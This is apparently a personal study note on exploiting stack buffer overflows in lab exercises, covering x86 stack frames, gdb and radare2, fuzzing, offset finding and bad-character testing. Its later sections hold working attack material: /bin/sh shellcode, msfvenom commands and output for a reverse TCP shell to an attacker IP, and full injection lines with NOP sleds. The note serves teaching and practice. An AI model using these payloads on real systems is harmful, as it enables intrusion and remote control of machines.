
#### Where to test buffer overflow

THM rooms and other exercises:
https://tryhackme.com/r/room/bof1 (Linux, r2 and gdb)
https://tryhackme.com/r/room/bufferoverflowprep (Windows, Immunity debugger)
https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/ (VM ISO)

Real world buffer overflow examples:
https://www.bleepingcomputer.com/news/security/you-can-bypass-authentication-on-hpe-ilo4-servers-with-29-a-characters/
https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit

Al tips:
"Hacking: The Art of Exploitation" book to check out
tool bofuzz

### What is Buffer Overflow

Buffer overflow is when vulnerable code allows us to write over a bigger section of memory than it should.
The C functions gets(), strcopy(), sprintf, scanf and strcat() are examples of functions that doesn't check the available space before writing.

Example
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
<font size=2>We have to do 15 chars though 14 actually overwrites the int variable but with the string terminating null, meaning the value doesn't change and we'd get "Try again?".</font>

### Low level program execution - Assembler

#### Registers

There are a number of registers, tiny bits of memory inside the processor, with special purposes.

The most important ones are:
- The Instruction pointer, ip, that keeps track of where in memory we are currently reading and executing instructions.
- The Stack pointer, sp, that keeps track of the memory address of the top of the stack.
- The Base pointer, bp, that keeps track of the memory address of current stack frame's start (aka Stack base pointer or Frame pointer)

There are also other registers, for example ax and bx, that have different specific functions in the execution of a program. Also the names of the registers are added to depending on the number of bits the program can handle.

More about registers here: [[Registers x86]]

#### Memory layout

When a program is executed two main areas of the computers memory are used, the stack and the heap.

##### The heap

The heap is mostly used for dynamically assigned memory.

##### The stack

A thing you need to remember about the stack is that it grows downwards - This means that for example when space for a new variable is declared the adress of this will be lower than the last one declared.

The stack is mainly used for saving smaller amounts of data. The most important being the next instruction to run and other registers after a function is called, local variables...

The assembler instructions push and pop can be used to quickly add/remove something to/from the stack, like a plate on a stack of plates (the reason for the name stack).

###### What push and pop actually does

push value:
`sub esp, 4`              Decrease the stack pointer by the size of the data (4 bytes)
`mov [esp], value`   Store the value at the address now pointed to by ESP

pop destination:
`mov destination, [esp]`  Load the value at ESP into the destination
`add esp, 4`                        Increase the stack pointer by the size of the data (4 bytes)

##### Stack Frames

For every function that is run a new bit of the stack is used. The old top of the stack (esp) will now be the base of the new Stack Frame (ebp). The stack frame will contain:
- the old instruction pointer (eip)
- the old base pointer (ebp)
- other registers saved by the code (compiler/programmer)
- local variables
The new top of the stack (esp) will be the stack frames top.

As you can see in the images a buffer is addressed from the "bottom" as the stack is growing to lower memory addresses.

![[Images/KmWsaIs.png|250]]    ![[Images/lqE6o0S.png|275]]

And when we put to much data into the buffer and get a buffer overflow it will overwrite what was previously put on the stack. First other variables, then other saved registers and then the saved base pointer (ebp) and instruction pointer (eip).

![[Images/buffer_overflow_2.webp|700]]

When we later leave the function, this will all reverse. The saved base pointer and instruction pointer are read back into the registers we will get a segmentation fault if they don't contain usable values. We need to get the right values into the right places.

#### Program flow in assembler

##### Call of function

Call does:
push eip            Saves the old instruction pointer to the stack
jmp function     Sets the instruction pointer to the functions memory address

##### At the start of a function

A function starts with:
push ebp           Save the old base pointer to the stack
mov ebp, esp    Copies the old stack pointer as a new base pointer
push ebx           Push possible regs that will be used in the function
sub esp, 0x404  Make space for the functions variables.. on the stack (in this case a char buffer of 1024 characters)

##### At the end of a function

A function end with:
leave      = mov esp, ebp   Save the old base pointer as a new stack pointer
         pop ebp            Get the old base pointer from the stack
ret          = pop eip            Get the old instruction pointer from the stack

Meaning leave and ret are really shorthand for these.


#### Exploring memory (stack and heap)

When we find a buffer overflow vulnerability we need more information. We can use different tools to explore memory and to debug and step through program execution. Hopefully we can run the program in a debugger or attach to a process with a GUI debugger like like edb (Linux) or Immunity debugger (Windows).

There are lots of tools available to debug and explore applications in different ways. For Linux we have for example [[r2 (radare2)]], [[gdb]], lldb, [[objdump]], readelf and edb (graphical). For Windows there are WinDbg, OllyDbg, Immunity Debugger, (IDA)... A modern choice is [[x64dbg (and x32dbg)]].

The simplest for basic info might be objdump:
`objdump -d <program>` disassemble program to get function adress..

More complex with almost infinite possibilities tools like are gdb and r2...

Examples gdb:

```sh
(gdb) info functions
0x0000000000400527  copy_arg
0x0000000000400564  main
...
```

```sh
(gdb) info registers
rax            0x400564 4195684
rbx            0x0      0
rbp            0x7fffffffe3b0   0x7fffffffe3b0
rsp            0x7fffffffe3b0   0x7fffffffe3b0
rip            0x400568 0x400568 <main+4>
...
```

```sh
(gdb) disassemble main
Dump of assembler code for function main:
   0x000011d2 <+0>:     lea    ecx,[esp+0x4]
   0x000011d6 <+4>:     and    esp,0xfffffff0
   0x000011d9 <+7>:     push   DWORD PTR [ecx-0x4]
   0x000011dc <+10>:    push   ebp
   0x000011dd <+11>:    mov    ebp,esp
```

```sh
(gdb) x/40x $sp
0x7fffffffdd30: 0x00000000      0x00000000      0xf7fe6c40      0x00007fff
0x7fffffffdd40: 0x00000000      0x00000000      0xf7ffdab0      0x00007fff
0x7fffffffdd50: 0x00000001      0x00000000      0xf7decc8a      0x00007fff
0x7fffffffdd60: 0xffffde50      0x00007fff      0x55555159      0x00005555
...
```


Examples r2:

```sh
[0x7ffff7dd9ef0]> afl
0x00400527    1 61           sym.copy_arg
0x00400564    1 51           main
...
```

```sh
[0x0040052b]> dr
rax = 0x7fffffffe623
rbx = 0x00000000
rsp = 0x7fffffffe2d0
rbp = 0x7fffffffe2d0
rip = 0x0040052b
...
```

```sh
[0x7ffff7dd9ef0]> pdf @main
┌ 51: int main (int argc, char **argv, char **envp);
│           0x00400564      55             push rbp
│           0x00400565      4889e5         mov rbp, rsp
│           0x00400568      4883ec10       sub rsp, 0x10
│           0x0040056c      897dfc         mov dword [var_4h], edi     ; argc
│           0x0040056f      488975f0       mov qword [var_10h], rsi    ; argv
...
```

```sh
[0x00400532]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
...
```

### Buffer Overflow

#### Overview

1. Fuzzing Parameters
2. Controlling EIP
3. Identifying Bad Characters
4. Finding a Return Instruction/Finding the shellcode address
5. Jumping to Shellcode

#### Is there a Buffer Overflow

First we need an input to test for overflow. It can be any other kind of input (user input, command line arguments, network commands, environment variables...). 

We can perform basic tests where we try different input, increasing the size to see if the program crashes:
`python -c "print('A' * 64)" | ./<program>`
`python -c "print('A' * 100)" | ./<program>`
`python -c "print('A' * 64 + '\x64\x63\x62\x61')" | ./<program>`
`echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0" | ./<program>`
`perl -e 'print "A"x64 . "\x24\x84\x04\x08"' | ./<program>`

``./<program> `python -c "print('A' * 64 + '\x64\x63\x62\x61')"` ``
`./<program> $(python -c "print('A' * 64 + '\x64\x63\x62\x61')")`
`./<program> 'echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0"'`

Look for open ports when the program is running and try sending data.
`netstat -a`

Confirm buffer overflow:
```sh
gdb -q bow32
run $(python -c "print('\x55' * 1200"))
Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

##### GUI programs

**Field**            **Example**
`Text Input Fields`  - Program's "license registration" field.
				- Various text fields found in the program's preferences.
`Opened Files`       Any file that the program can open.
`Program Arguments`  Various arguments accepted by the program during runtime.              
`Remote Resources`   Any files or resources loaded by the program on run time or on a certain condition
...

##### Test input file creation

Create a file with 10000 As:
`python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"`

Create a non random file for finding the pos to overwrite:
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
`python -c "print('the random string', file=open('fuzz.wav', 'w'))"`

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31684630` where 0x31684630 is the contents of eip at the buffer overflow crash

#### Check position of saved instruction pointer on stack

The next step is to change the value of the instruction pointer. This cannot be done directly, as it is read only, but the old value of the instruction pointer is saved on the stack when a function is called. This is where it can possibly be overwritten.

We want to see what part of the input we gave ends up where in memory. You can make a string to test with manually or use a tool.

Metasploit has two helpful scripts. One to generate a non-repetitive string and one to give us the offset (position) of a part of this string.

`/usr/share/metasploit-framework/tools/exploit/pattern-create.rb`
	`-l`, `--length <length>`         The length of the pattern
    `-s`, `--sets <ABC,def,123>`   Custom Pattern Sets
    `-h`, `--help`                             Show help
	`./pattern_create.rb -l 500` Creates a non-repetitive string with length 500

`/usr/share/metasploit-framework/tools/exploit/pattern-offset.rb`
    `-q`, `--query Aa0A`                 Query to Locate
    `-l`, `--length <length>`        The length of the pattern
    `-s`, `--sets <ABC,def,123>`  Custom Pattern Sets
    `-h`, `--help`                            Show help
	`./pattern_offset -l 500 -q 63413163` Returns the position of the 0x63413163`

Example:
```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
gdb -q bow32
run $(cat pattern.txt)
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569        
[*] Exact match at offset 1036
```

Test that the position is correct:
```sh
gdb -q bow32
run $(python -c "print('\x55' * 1036 + '\x66' * 4)")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Yay, we can set eip!

Remember this number for later!


#### Find out how much space we have for shellcode

...

#### Find bad characters

We need to find out if all bytes are acceptable input. We can probably assume that null will terminate the string ;)

Quick python script to generate all 256 numbers:
```python
for number in range(256):
  print(f"\\x{number:02x}", end='')
```
end='' removes newline
{} is a formatting placeholder in strings, here two digit lowercase hex format
	: separates number and formatting

or:
```python
print(''.join(f'\\x{c:02x}' for c in range(256)))
```

All 256 two hex digit possibilities: `"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"`

Common bad characters
- `\x00` - Null byte
- `\x08` – Backspace
- `\x09` - Horizontal tab
- `\x0A` – Line Feed (LF) or Newline
- `\x0B` – Vertical Tab (VT)
- `\x0C` – Form Feed (FF)
- `\x0D` – Carriage Return (CR)
- `\x20` – Space
- `\x25` - Percent (%)
- `\x2E` - period, dot
- `\x2F` - Forward slash (/)
- `\x5C` - Backslash ()
- `\x5F` - Underscore
- `\xFF` - Often used as EOF (End of file)

ex. `\x00\x09\x0a\x20`

Suggestion from n1ght3r: Use there and don't check every time `\x00\x0a\x0d\x5c\x5f\x2f\x2e`.

To do this we will send all characters along with the input:
`run $(python -c 'print("\x55" * (1040 - 256 - 4) + "\x00\x01\x02..<SNIP>...xfd\xfe\xff" + "\x66" * 4)')`

Then we look in memory if all characters are there:
`x/2000xb $esp+500`
`(gdb) x/2000xb $esp+2200`
(<font color=red>Observe we have to break program execution with a breakpoint</font>)

```sh
0xffffd668:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd670:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd678:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd680:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd688:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd690:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd698:     0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03
0xffffd6a0:     0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
0xffffd6a8:     0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14
0xffffd6b0:     0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c
0xffffd6b8:     0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23    0x24
0xffffd6c0:     0x25    0x26    0x27    0x28    0x29    0x2a    0x2b    0x2c
0xffffd6c8:     0x2d    0x2e    0x2f    0x30    0x31    0x32    0x33    0x34
```
Instead of 0x09 we have 0x00. This means 0x09 is a bad character.

There will be characters missing in memory. Remove one at a time from the start and write them down. Then repeat until you have found all characters.

ex badchars in hex: `\x00\x09\x0A\x20`

#### Using shell code

We want to put code in memory and then redirect execution to this memory.

We use a number of nop instructions to make the address of the exploit easier to get to. If we have 30 nops all addresses within these will lead execution to the shell code.

Structure of the input:
`python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"`

Example:
`python -c "print('\x90'*30+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*60+'\xef\xbe\xad\xde')" | ./program`


#### Example shell code

Shell code that opens a basic shell (source THM) (useful if SUID is set)
```
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3
```
28 bytes

The shell code disassembled using r2, commands aaa and then pdf:
![[Images/Pasted image 20240809204245.png]]
<font size=2>A string containing the path to /bin/sh + 0x11 (random extra byte) is put in the RCX registry.<br>
To get rid of the extra 0x11 rcx is first shifted one byte to the left and then to the right.<br>
RCX is then pushed onto the stack.<br>
Other requirements for the syscall (execve) to exectue the path are prepared and then the syscall is made.</font>

#### Generate shell code

`msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>`

`msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"`

`msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.245 lport=443 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"`

```sh
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.245 lport=443 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"                
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb"
"\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b"
"\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2"
"\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8"
"\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3"
"\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee";
```

Shellcode: 
```
\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee
```

Number of bytes: 95

<font color="yellow">Add 16 or more nops</font> - When the payload in decoded/unpacked it will take more space.

#### Find the execution start address

the position returned by pattern_offset.rb = 2060
a random number of nops = 256
the number of bytes in the payload = 95
32-bit executable gives a 32-bit address = 4 bytes

```sh
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x66" * 4')
```

Afterwards we confirm that it's been entered  into memory in the format we supplied with python.

```sh
(gdb) x/2000xb $esp+2200

0xffffd6b1:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6b9:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6c1:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6c9:     0x55    0x90    0x90    0x90    0x90    0x90    0x90    0x90  Nops
0xffffd6d1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6d9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6e1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6e9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6f1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6f9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd701:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd709:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd711:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd719:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd721:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd729:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd731:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd739:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd741:     0x90    0x90    0x90    0x90    0x90    0xbd    0xca    0x92  Shell code
0xffffd749:     0xd0    0xf7    0xdb    0xcd    0xd9    0x74    0x24    0xf4
0xffffd751:     0x5b    0x31    0xc9    0xb1    0x12    0x83    0xc3    0x04
0xffffd759:     0x31    0x6b    0x0e    0x03    0xa1    0x9c    0x32    0x02
0xffffd761:     0x04    0x7a    0x45    0x0e    0x35    0x3f    0xf9    0xbb
0xffffd769:     0xbb    0x36    0x1c    0x8b    0xdd    0x85    0x5f    0x7f
0xffffd771:     0x78    0xa6    0x5f    0x4d    0xfa    0x8f    0xe6    0xb4
0xffffd779:     0x92    0x70    0x19    0x47    0x63    0xe7    0x1b    0x47
0xffffd781:     0x19    0x9e    0x92    0xa6    0x6d    0x06    0xf5    0x79
0xffffd789:     0xde    0x74    0xf6    0xf0    0x01    0xb7    0x79    0x50
0xffffd791:     0xa9    0x26    0x55    0x26    0x41    0xdf    0x86    0xe7
0xffffd799:     0xf3    0x76    0x50    0x14    0xa1    0xdb    0xeb    0x3a
0xffffd7a1:     0xf5    0xd7    0x26    0x3c    0x66    0x66    0x66    0x66  66666666 repersents the spot where the instruction pointer will be restored from
```

We select an address in the middle of out nops, `0xffffd731`, as our start address.

Remember the endianness and reverse the address when adding it to the python:
0xffffcc90
```sh
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x31\xd7\xff\xff"')
```

Now our shellcode will hopefully be run!

#### Finding a Return Instruction

In some cases we want to put the shellcode efter the eip/address so that it will be located the stack pointer position. In this case we can use another method to jump to the shell code:

We can set eip to point to a `jmp esp`, `call esp` or `push esp; ret` instruction/s in the actual program - not to the stack.

To find there instructions in the program using x64dbg we can:

Logs tab:
- `erc --moduleinfo`  list all the processes modules
- Find the ones with no protection, all false.
- The programs own files are more likely to be running on another machine, especially the main executable.

Symbols tab (Alt+E):
- Double click the module name to jump to it in the CPU tab.
- Ctrl+F to search for an instruction in the module. For example `jmp esp`.
	If we need to search for more than one instruction we use Ctrl+B and enter the hex machine code for the instructions.
	https://defuse.ca/online-x86-assembler.htm can be used to convert instructions to machine code.
- The searches will hop us to the References tab. Mouse over or double click for more into.

